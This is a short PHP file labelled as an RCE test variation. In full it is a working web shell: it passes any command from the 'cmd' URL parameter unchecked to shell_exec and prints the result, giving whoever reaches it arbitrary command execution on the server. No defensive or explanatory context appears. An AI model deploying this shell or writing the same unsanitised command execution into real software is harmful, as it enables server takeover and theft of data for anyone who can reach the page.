<?php
// RCE test variation #368
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>